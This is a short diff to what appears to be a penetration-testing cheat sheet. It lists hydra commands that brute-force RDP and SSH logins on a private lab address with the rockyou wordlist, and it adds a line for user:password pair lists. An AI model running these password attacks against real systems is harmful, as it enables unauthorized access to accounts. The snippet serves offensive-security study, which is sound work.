@@ -7,4 +7,7 @@ hydra -L user.lst -P rockyou.txt rdp://192.168.75.68
 
 # use -t 4 for ssh
 hydra -L user.list -P rockyou.txt ssh:192.168.75.68 -t 4
+
+# Using a UserPass list i.e. user:password
+hydra -C <user_pass.lst> <protocol>://<ip>
 ```
